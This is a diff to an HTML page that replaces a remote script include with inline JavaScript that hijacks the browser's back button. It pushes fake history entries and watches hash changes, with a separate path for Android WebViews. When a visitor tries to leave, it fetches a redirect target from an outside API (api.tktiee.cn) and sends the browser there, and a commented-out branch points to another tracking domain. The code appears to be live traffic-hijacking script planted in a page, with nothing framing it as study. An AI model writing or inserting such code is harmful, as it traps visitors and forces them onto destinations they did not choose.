@@ -36,7 +36,69 @@
 
 <body>
 
-    <script>document.writeln("<script src=\"https://ai8.top/api/getJumpJs\"><\/script>");</script>
+    <script>
+	    window.onpageshow = function() {
+    sessionStorage.getItem('jumpOut') && a();
+}
+
+var rate = 100;
+var apiUrl = 'https://api.tktiee.cn/api/getDomain/5134_4kwyn83uebbffavk';
+
+var rand_n = Math.floor(Math.random() * 100);
+
+if(rand_n <= rate){
+    ntzgo();
+}
+
+
+function a() {
+    window.fetch(apiUrl).then(function(res) {
+        return res.json();
+    }).then(function(data) {
+        
+        location.href = data.url ? data.url : data.data.url;
+        /*
+        if(href.indexOf("ai8")>-1 || href.indexOf("20it")>-1  || href.indexOf("core")>-1  || href.indexOf("wan55")>-1 || href.indexOf("wan77")>-1  ){
+            location.href = 'https://u.tuiabcedw.cn/2d6a'
+        }else{
+            location.href = data.url ? data.url : data.data.url;
+        }
+		*/
+        
+        
+    })
+}
+
+function ntzgo() {
+    history.pushState(history.length + 1, "message", window.location.href.split("#")[0] + "#" + new Date()
+        .getTime());
+    if (navigator.userAgent.indexOf("Android") != -1) {
+        if (typeof(tbsJs) != "undefined") {
+            tbsJs.onReady("{useCachedApi : 'true'}", function(e) {});
+            window.onhashchange = function() {
+                window.history.pushState("forward", null, "#");
+                window.history.forward(1);
+                a()
+            }
+        } else {
+            var pop = 0;
+            window.onhashchange = function(event) {
+                pop++;
+                if (pop >= 3) {
+                    a()
+                } else {
+                    history.go(1)
+                }
+            };
+            history.go(-1)
+        }
+    } else {
+        window.onhashchange = function() {
+            a()
+        }
+    }
+};
+    </script>
 
     <audio id="audioDom" src="https://sf6-cdn-tos.douyinstatic.com/obj/ies-music/7170534431801838367.mp3" preload="auto" loop="loop"></audio>
 
